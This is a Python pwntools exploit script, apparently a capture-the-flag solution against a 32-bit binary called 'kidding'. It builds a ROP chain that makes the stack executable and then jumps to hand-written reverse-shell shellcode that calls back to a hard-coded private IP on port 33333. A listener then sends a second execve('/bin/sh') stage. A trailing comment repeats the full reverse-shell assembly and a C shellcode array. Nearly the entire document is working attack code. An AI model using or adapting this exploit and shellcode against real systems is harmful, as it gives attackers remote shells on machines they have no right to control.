#!/usr/bin/env python 
from pwn import *

LOCAL  = False
Debug  = True
SERVER = '172.16.113.50'
PORT   = 12031
Binary = 'kidding'

# lib = ELF('./libc.so.6.32')
# Hint: dl-execstack.c 
      
def L(msg):
    if Debug:
        print msg

if not LOCAL:
    r = remote(SERVER, PORT)
else:
    r = process('./{}'.format(Binary))
    L(r.proc.pid)
    a = raw_input('Wait gdb attach...\n')


'''
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
'''


if __name__ == "__main__":
    
    _dl_make_stack_executable = 0x0809a080
    __stack_prot              = 0x080E9FEC
    __libc_stack_end          = 0x080E9FC8
    call_edx                  = 0x080487cd
    call_esp                  = 0x080c99b0
    xchg_eax_ebp              = 0x0804b4a9
    
    ReverseShell              = ""
    ReverseShell += "\x50\x40\x50\x89\xC3\x40\x50\x89\xC2\x89\xE1\x6A\x66\x58\xCD\x80\x4A"
    ReverseShell += "\x79\xf8"
    ReverseShell += "\x4B\x5a\x59"
    ReverseShell += "\xb0\x3f"
    ReverseShell += "\xcd\x80"
    
    #connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    ReverseShell += "\xb0\x66"
    ReverseShell += "\x87\xda"
    ReverseShell += "\x68" + "\xac\x10\x1f\x3b"  # push  IP
    ReverseShell += "\x66\x68" + "\x82\x35"      # pushw port    
    ReverseShell += "\x66\x53"
    ReverseShell += "\x43"
    ReverseShell += "\x89\xe1"
    ReverseShell += "\x6a\x10"
    ReverseShell += "\x51"
    ReverseShell += "\x52"
    ReverseShell += "\x89\xe1"
    ReverseShell += "\xcd\x80"
    
    #read(socket,buf, len)
    ReverseShell += "\xb0\x03\x89\xd3"
    ReverseShell += "\xb2\xaf"
    ReverseShell += "\xcd\x80"
    

    """
    #; execve("/bin/sh", NULL , NULL);
    ReverseShell += "\xb0\x0b"
    #ReverseShell += "\x99"
    ReverseShell += "\x89\xd1"
    #ReverseShell += "\x52"
    ReverseShell += "\x68\x2f\x2f\x73\x68"
    ReverseShell += "\x68\x2f\x62\x69\x6e"
    ReverseShell += "\x89\xe3"
    ReverseShell += "\xcd\x80"
    
    ReverseShell += "\x02\x00\x82\x35"
    ReverseShell += "\xac\x10\x1f\x3b"
    ReverseShell += "\x00"
    """
    

    
    from struct import pack

    # ROP + SHELL CODE ONE (ROP + SHELLCODE)
    
    # Padding goes here
    p = 'aaaabbbb'+ p32(__libc_stack_end) # for later use

    # change stack_prot to 7 (rwx)
    p += pack('<I', 0x0806ec8b) # pop edx ; ret
    p += p32(__stack_prot) # stack_prot
    p += p32(0x0808eff0)   # mov eax, 7 ; ret
    p += pack('<I', 0x0805462b) # mov dword ptr [edx], eax ; ret

    # call make_stack_executable(stack_end)
    p += p32(xchg_eax_ebp)
    p += p32(_dl_make_stack_executable)
    p += p32(call_esp)
    p += ReverseShell    
    
    
    
    # SHELL CODE TWO
    
    padding = "a"*88   
    s2 = padding
    s2 += "\xb0\x0b"
    s2 += "\x99"
    s2 += "\x89\xd1"
    s2 += "\x52"
    s2 += "\x68\x2f\x2f\x73\x68"
    s2 += "\x68\x2f\x62\x69\x6e"
    s2 += "\x89\xe3"
    s2 += "\xcd\x80"
    shh = s2

    l = listen(33333)

    # We send ROP+SHELLCODEONE to Question, and listen on localhost:33333
    # When remotehost connect to localhost:33333 we send SHELLCODE TWO immediately, 
    # which is execve('/bin/sh'), And SHELLCODE TWO will cover the stack and write 
    # the shellcode in the position where we can't touch earlier. 
    r.send(p)
    re = l.wait_for_connection() 
    re.sendline(shh)
    re.interactive()




"""
Full reverse shell work flow 

_start:
    ; socket(AF_INET, SOCK_STREAM, 0);
    push 0x66           ; socketcall()
    pop eax
    cdq                 ; zero out edx
    push edx            ; protocol
    inc edx
    push edx            ; SOCK_STREAM
    mov ebx, edx        ; socket()
    inc edx
    push edx            ; AF_INET
    mov ecx, esp        ; load address of the parameter array
    int 0x80            ; call socketcall()

    ; dup2(old, new)
    xchg ebx, eax       ; store sockfd in ebx
    mov ecx, edx        ; initialize counter to 2
    loop:
        mov al, 0x3f    
        int 0x80
        dec ecx
        jns loop

    ; connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    mov al, 0x66        ; socketcall()
    xchg ebx, edx       ; ebx=2, edx=sockfd
    push 0x8501A8C0     ; 192.168.1.133 # change to real
    push word 0x3582    ; port=33333
    push word bx        ; AF_INET   
    inc ebx             ; connect() -> 3
    mov ecx, esp        ; point to the structure
    push 0x10           ; sizeof(struct sockaddr_in)
    push ecx            ; &serv_addr
    push edx            ; sockfd
    mov ecx, esp        ; load address of the parameter array
    int 0x80            ; call socketcall()

    ; execve("/bin/sh", NULL , NULL);
    --push 0xb            ; execve()
    --pop eax
    mov al,0xb
    --cdq                 ; zero out edx
    mov ecx, edx        ; zero out ecx
    --push edx            ; push null bytes (terminate string)
    push 0x68732f2f     ; //sh
    push 0x6e69622f     ; /bin
    mov ebx, esp        ; load address of /bin/sh
    int 0x80            ; call execve()
    */
     
#include <stdio.h>
#include <string.h>
 
unsigned char code[] = \
"\x6a\x66\x58\x99\x52\x42\x52\x89\xd3\x42\x52\x89\xe1\xcd\x80\x93\x89\xd1\xb0"
"\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x87\xda\x68"
"\xc0\xa8\x01\x85"  // <--- ip address
"\x66\x68"
"\x82\x35"          // <--- tcp port
"\x66\x53\x43\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x6a\x0b\x58\x99\x89\xd1"
"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
"""


